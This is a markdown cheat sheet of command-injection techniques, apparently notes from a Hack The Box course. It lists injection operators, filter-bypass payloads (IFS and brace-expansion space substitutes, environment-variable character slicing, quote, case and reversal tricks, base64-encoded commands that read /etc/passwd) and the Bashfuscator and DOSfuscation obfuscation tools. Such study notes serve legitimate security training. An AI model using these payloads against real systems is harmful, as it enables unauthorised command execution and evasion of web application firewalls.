
## Table of Contents:

- [[#Dangerous Functions]]
- [[#Injection Methods]]
- [[#Identifying Filters]]
- [[#Bypass Blacklisted Spaces Filters]]
- [[#Other blacklisted characters]]
- [[#Bypassing Blacklisted Commands]]
- [[#Evasion Tools]]

---
## Bypassing Front End Validation

Use Burp to send the request or remove the JavaScript responsible for this check.

---

## Dangerous Functions

#### PHP Dangerous Functions
- exec
- system
- shell_exec
- passtrhu
- popen
#### NodeJS Dangerous Functions
- child_process.exec
- child_process.spawn

---

## Injection Methods

To inject an additional command to the intended one, we may use these operators:

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|\|`                  | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both **(Linux-only)**                      |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both **(Linux-only)**                      |

``` Note
The only exception, semi-colon `;`, will not work if the command was being executed with `Windows Command Line (CMD)`, but work `Windows PowerShell`.
```

---

## Identifying Filters

`If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF`

Let us check the payload we sent:
```bash
127.0.0.1; whoami
```

Other than the IP (which we know is not blacklisted), we sent:
1. A semi-colon character `;`
2. A space character
3. A `whoami` command

So, the web application either `detected a blacklisted character` or `detected a blacklisted command`, or both. So, let us see how to bypass each.

---

## Bypass Blacklisted Spaces Filters

#### Using New Line

```
%0d%0a
```

#### Using Tabs - %09

```sh
127.0.0.1%0a%09
```

#### Using $IFS - ${IFS} Linux Environment Variable

``` sh
127.0.0.1%0a${IFS}
```

#### Using Brace Expansion - {ls,/}

```sh
127.0.0.1%0a{ls,-la}
```

---

## Other blacklisted characters

#### Linux - Using Environment Variables

```sh
> echo ${PATH:0:1}
  ### '/' is outputted as 0th char of PATH env variable.

> 127.0.0.1${LS_COLORS:10:1}${IFS}
  ### This bypasses the ; filter.
```

We can use `printenv` to check all the environment variables available to us.

#### Linux - Character Shifting

```sh
> man ascii     ### \ is on 92, before it is [ on 91
> echo $(tr '!-}' '"-~'<<<[)  ### shifts the char we pass by 1 
```

#### Windows - Using Environment Variables

```PowerShell
C:\htb> echo %HOMEPATH:~6,-11%
### Starts from 6th index and removes 11 chars from end as we used '-'

C:\htb> echo %HOMEPATH:~6,1%
### Starts from 6th index and only keeps 1 char from the start.

PS C:\htb> $env:HOMEPATH[0]
### We can use [0..3] to get first 4 chars
```

`Get-ChildItem Env:` PowerShell command prints all environment variables.

---

## Bypassing Blacklisted Commands

#### Linux & Windows 

```shell
w'h'o"am"i   ### must be even in no.
```

#### Linux Only

``` sh
> who$@am\i
  ### Ignored characters, '\' and '$@'

> $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
> $(a="WhOaMi";printf %s "${a,,}")
> $(rev<<<'imaohw')
  ### Case manipulation - MUST NOT USE ANY FILTERED CHARS
 

> echo -n 'cat /etc/passwd | grep 33' | base64
> echo -n whoami | iconv -f utf-8 -t utf-16le | base64 ### for Windows
> bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
  ### Encoded Commands

  # find /usr/share/ | grep root | grep mysql | tail -n 1
  # tail -n 1< <(grep root < <(grep mysql < <(find /usr/share/ )))
```

`InjectGen.py` can also be used.  [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion) got more techniques.

#### Windows Only

```PowerShell
C:\htb> whO^aMi
### Ignored characters and case manipulation in both cmd and PS

PS C:\htb> "whoami"[-1..-20] -join ''
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
### Reversed commands, executing with PS sub shell

PS C:\htb> [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("whoami"))
### Encoding the command

PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
### Decoding and executing the encoded command
```

---

## Evasion Tools
#### Linux - [BashFuscator](https://github.com/Bashfuscator/Bashfuscator)

```shell
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
### Shorter and simpler obfuscation with these flags
```
#### Windows - [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)

```powershell
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
```

```powershell
Invoke-DOSfuscation> help
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

...SNIP...
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%Sys
```

We can test all these windows commands on linux using [pwsh](https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux).
 
---